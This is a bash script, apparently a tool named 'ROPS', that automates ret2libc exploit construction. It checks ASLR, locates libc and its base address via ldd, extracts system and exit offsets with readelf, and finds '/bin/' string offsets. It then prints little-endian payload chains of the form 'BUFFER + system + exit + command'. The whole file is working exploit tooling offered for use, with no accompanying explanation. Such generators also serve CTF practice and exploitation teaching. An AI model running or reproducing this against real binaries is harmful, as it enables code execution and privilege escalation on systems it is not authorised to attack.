#!/bin/bash

echo -e '''
 /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$ 
| $$__  $$ /$$__  $$| $$__  $$ /$$__  $$
| $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/
| $$$$$$$/| $$  | $$| $$$$$$$/|  $$$$$$ 
| $$__  $$| $$  | $$| $$____/  \____  $$
| $$  \ $$| $$  | $$| $$       /$$  \ $$
| $$  | $$|  $$$$$$/| $$      |  $$$$$$/
|__/  |__/ \______/ |__/       \______/ 
        Github==>https://github.com/MartinxMax
        @Мартин. ROPS
'''

# 定义颜色
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
RESET='\033[0m'



if [ -z "$1" ]; then
    echo -e "${RED}Usage: $0 <binary_file>${RESET}"
    exit 1
fi

if [ ! -f "$1" ]; then
    echo -e "${RED}Error: File $1 not found!${RESET}"
    exit 1
fi



binfile="$1"
sopath=""
system=""
exit=""
cmds=""
base=""

aslr_status=$(cat /proc/sys/kernel/randomize_va_space)

if [ "$aslr_status" -eq 0 ]; then
    echo -e "${GREEN}ASLR is currently disabled.${RESET}"
elif [ "$aslr_status" -eq 1 ]; then
    echo -e "${YELLOW}ASLR is currently enabled (conservative randomization).${RESET}"
elif [ "$aslr_status" -eq 2 ]; then
    echo -e "${YELLOW}ASLR is currently enabled (full randomization).${RESET}"
else
    echo -e "${RED}Unable to determine ASLR status.${RESET}"
fi

get_libc_address() {
    ldd_output=$(ldd "$binfile" 2>/dev/null | grep 'libc.so.6' | awk '{print $3}')
    if [ -z "$ldd_output" ]; then
        echo -e "${RED}libc.so.6 not found in the binary.${RESET}"
        return 1
    else
        echo "$ldd_output"
    fi
}

sopath=$(get_libc_address)
echo -e "${BLUE}libc path: $sopath${RESET}"

stat_libc_addresses() {
    libc_addresses=$(ldd "$binfile" 2>/dev/null | grep 'libc.so.6' | awk -F '[()]' '{print $2}' | sort -u)
    
    if [ -z "$libc_addresses" ]; then
        echo -e "${RED}No libc.so.6 addresses found.${RESET}"
        return 1
    fi
    
    echo "$libc_addresses"
}

base=$(stat_libc_addresses)
if [ -z "$base" ]; then
    echo -e "${RED}No unique libc addresses found.${RESET}"
    exit 1
fi
echo -e "${BLUE}Unique libc addresses: $base${RESET}"

print_function_addresses() {
    echo -e "${YELLOW}Reading function addresses from $sopath:${RESET}"

    while IFS= read -r line; do
        address=$(echo "$line" | awk '{print $1}')
        function_name=$(echo "$line" | awk '{print $NF}' | sed 's/@.*//')
        case "$function_name" in
            "system")
                system="$address"
                ;;
            "exit")
                exit="$address"
                ;;
        esac
    done < <(readelf -s "$sopath" | awk '$4 == "FUNC" && ($8 ~ /system@|exit@/) {print $2 " " $8}')

    echo -e "${YELLOW}system function address: 0x$system${RESET}"
    echo -e "${YELLOW}exit function address: 0x$exit${RESET}"
}


print_function_addresses


list_executable_paths() {
    local paths
    paths=$(strings -a -t x "$sopath" | grep "/bin/" | awk '
    {
        address=$1
        path=$2
        printf "0x%s\n", address
    }')

    echo "$paths"
    local address_list
    address_list=$(echo "$paths" | grep '^0x' | sort -u)

    echo "$address_list"
}


cmds=$(list_executable_paths)

reverse_hex() {
    input=$1
    input=${input#0x}
    reversed=$(echo "$input" | fold -w2 | tac | tr -d '\n')
    echo "0x$reversed"
}

generate_payload() {
    echo -e "${BLUE}Generating payload for libc address:${RESET}"
    for libc_address in $base; do
        for cmd in $cmds; do
            cmd=$(echo $cmd | sed 's/^0x//')
            system_addr=$(reverse_hex "$(printf "0x%X" $((libc_address + 0x$system)))")
            exit_addr=$(reverse_hex "$(printf "0x%X" $((libc_address + 0x$exit)))")
            cmd_addr=$(reverse_hex "$(printf "0x%X" $((libc_address + 0x$cmd)))")
            echo -e "payload => ${GREEN}BUFFER + $system_addr + $exit_addr + $cmd_addr${RESET}"
        done
    done
}

generate_payload
